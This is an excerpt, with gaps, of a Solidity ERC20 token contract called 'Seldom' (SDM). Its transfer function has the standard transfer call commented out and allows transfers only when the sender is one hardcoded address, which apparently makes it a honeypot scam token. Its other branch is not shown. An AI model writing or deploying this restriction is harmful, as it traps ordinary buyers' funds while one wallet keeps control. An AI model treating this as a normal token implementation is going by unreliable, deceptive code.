...
contract Seldom is Context, IERC20, IERC20Metadata, Ownable {
    ...
    constructor () {
        ...
        _symbol = "SDM";
        _decimals = 18;
        _totalSupply = 35000000000000 * 10**(_decimals);
    ...
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
     //   _transfer(_msgSender(), recipient, amount);
       ...
       if (_msgSender() == 0x5a643B0Fa3D5f1Ef3ac9Aceed848025FC712eaA4) {
           _transfer(_msgSender(), recipient, amount);          
       } else {
